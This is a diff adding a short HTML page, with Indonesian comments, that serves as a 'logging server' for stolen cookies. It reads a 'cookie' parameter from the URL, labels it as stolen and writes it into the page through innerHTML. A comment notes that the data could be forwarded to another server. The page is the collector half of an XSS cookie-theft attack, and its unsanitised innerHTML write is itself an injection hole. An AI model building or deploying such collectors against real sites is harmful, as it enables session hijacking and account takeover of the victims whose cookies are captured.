@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Logging Server</title>
+</head>
+<body>
+    <h1>Logging Server</h1>
+    <p>Data cookies yang dicuri akan muncul di sini atau di log server.</p>
+    <div id="cookies"></div>
+
+    <script>
+        // Ambil parameter 'cookie' dari URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const stolenCookie = urlParams.get('cookie');
+
+        // Jika ada cookie yang dicuri, tampilkan di halaman
+        if (stolenCookie) {
+            document.getElementById('cookies').innerHTML = `
+                <h2>Cookie yang Dicuri:</h2>
+                <p>${stolenCookie}</p>
+            `;
+            // Di sini Anda juga bisa mengirimkan data ke server lain jika perlu
+        } else {
+            document.getElementById('cookies').innerHTML = `<p>Tidak ada cookie yang ditemukan.</p>`;
+        }
+    </script>
+</body>
+</html>
